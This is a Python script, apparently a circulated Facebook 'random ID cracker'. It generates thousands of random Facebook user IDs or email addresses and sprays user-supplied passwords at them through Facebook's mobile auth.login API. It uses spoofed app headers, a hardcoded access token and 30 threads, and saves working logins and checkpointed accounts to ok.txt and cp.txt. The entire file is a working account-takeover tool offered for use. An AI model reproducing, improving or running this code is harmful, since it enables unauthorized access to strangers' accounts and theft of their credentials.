# -*- coding: utf-8
import os
try:
	import requests
except ImportError:
	print("\n [!] \033[0;91mmodule requests belum terinstall \033[0;97m")
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] \033[0;91mmodule futures belum terinstall\033[0;97m")
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		self.ips = requests.get("http://13.93.153.143/~anggakurniawan/myip/").text
		os.system("clear")
		print """
\033[7;91m _______        _       ____  _____       _       
\033[7;91m|_   __ \      / \     |_   \|_   _|     / \      
\033[7;91m| |__) |      / _ \      |   \ | |      / _ \     
\033[7;91m|  __ /      / ___ \     | |\ \| |     / ___ \    
\033[7;91m| |  \ \_  _/ /   \ \_  _| |_\   |_  _/ /   \ \_  
\033[7;91m|____| |___||____| |____||_____|\____||____| |____|\033[0m 
\033[1;97m     .........................................
\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[90;1m๑۩۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;91mAuthor©\033[1;93m  : \033[7;91mRana Nadeem Rajput\033[0m
\033[1;95mYoutube\033[1;93m  : \033[7;95mTrick Master\033[0m
\033[1;96mFacebook\033[1;93m  : \033[7;96mhttps://www.facebook.com/ITXRANA.5214\033[0m
\033[1;92mWhatsapp\033[1;93m : \033[7;92m03082503426\033[0m
\033[1;97m«-----------------------\033[90;1m✧✧\033[1;97m-----------------------»"""
		print(" [*] FB      : https://fb.com/ITXRANA.5214") 
		print(" [*] IP      : %s"%(self.ips)) 
		print("\n [1]. crack random id fb baru")
		print(" [2]. crack random id fb muda")
		print(" [3]. crack random id fb tua")
		print(" [4]. crack random email fb")
		tanya = input("\n [?] Select : ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
			self.fbbaru()
		elif tanya in ["2", "02"]:
			self.fbmuda()
		elif tanya in ["3", "03"]:
			self.fbtua()
		elif tanya in ["4", "04"]:
			self.email()
		else:
			Main()

	def fbbaru(self):
		x = 11111111111
		xx = 77777777777
		idx = "1000" 
		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
				listpass = input(" [?] masukan kata sandi : ")
				if len(listpass)<=5:
					exit("\n [!] kata sandi minimal 6 karakter")
				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [+] hasil ok tersimpan di -> ok.txt")
				print(" [+] hasil cp tersimpan di -> cp.txt")
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [#] crack Complete...")
		except Exception as e:exit(str(e))
	
	def fbmuda(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
				listpass = input(" [?] masukan kata sandi : ")
				if len(listpass)<=5:
					exit("\n [!] kata sandi minimal 6 karakter")
				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [+] hasil ok tersimpan di -> ok.txt")
				print(" [+] hasil cp tersimpan di -> cp.txt")
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [#] crack Complete...")
		except Exception as e:exit(str(e))

	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
				listpass = input(" [?] masukan kata sandi : ")
				if len(listpass)<=5:
					exit("\n [!] kata sandi minimal 6 karakter")
				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [+] hasil ok tersimpan di -> ok.txt")
				print(" [+] hasil cp tersimpan di -> cp.txt")
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [#] crack Complete For Exit Type python2 run.py...")
		except Exception as e:exit(str(e))

	def email(self):
		x = 111
		xx = 999
		nama = input(" [?] masukan nama (cth: angga): ")
		nama = nama.replace(" ", "")
		domain = input(" [?] [G]mail.com, [Y]ahoo.com, [H]otmail.com : ")
		if domain in [""]:Main()
		elif domain in ["G", "g"]:
			idx = "@gmail.com"
		elif domain in ["Y", "y"]:
			idx = "@yahoo.com"
		elif domain in ["H", "h"]:
			idx = "@hotmail.com"
		else:Main()
		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nama
				self.id.append(___+str(_)+__)
			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
				listpass = input(" [?] masukan kata sandi : ")
				if len(listpass)<=5:
					exit("\n [!] kata sandi minimal 6 karakter")
				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
				print("\n [+] hasil ok tersimpan di -> ok.txt")
				print(" [+] hasil cp tersimpan di -> cp.txt")
				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [#] crack Complete For Exit Type python2 run.py...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r [*] crack: %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m[RANA.OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;93m[RANA.CP %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print """
\033[7;91m _______          _       ____  _____       _       
\033[7;91m|_   __ \        / \     |_   \|_   _|     / \      
\033[7;91m | |__) |      / _ \      |   \ | |      / _ \     
\033[7;91m |  __ /      / ___ \     | |\ \| |     / ___ \    
\033[7;91m _| |  \ \_  _/ /   \ \_  _| |_\   |_  _/ /   \ \_  
\033[7;91m|____| |___||____| |____||_____|\____||____| |____|\033[0m 
\033[1;97m     .........................................
\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[90;1m๑۩۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;91mAuthor©\033[1;93m: \033[7;91mRana Nadeem Rajput\033[0m
\033[1;95mYoutube\033[1;93m: \033[7;95mTrick Master\033[0m
\033[1;96mFacebook\033[1;93m: \033[7;96mhttps://www.facebook.com/ITXRANA.5214\033[0m
\033[1;92mWhatsapp\033[1;93m: \033[7;92m03082503426\033[0m
\033[1;97m«-----------------------\033[90;1m✧✧\033[1;97m-----------------------»"""
		print("\n [*] Author    : RANA NADEEM RAJPUT")
		print(" [*] Team      : ANNOS,ABDULLAH RISHU\n")
		print(" [ Sosial Media ID ] \n")
		print(" [*] Facebook  : https://facebook.com/ITXRANA.5214")
		print(" [*] Instagram : https://instagram.com/RANAG.5214")
		exit(" [*] GitHub    : https://github.com/Rananadeem5214")
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))
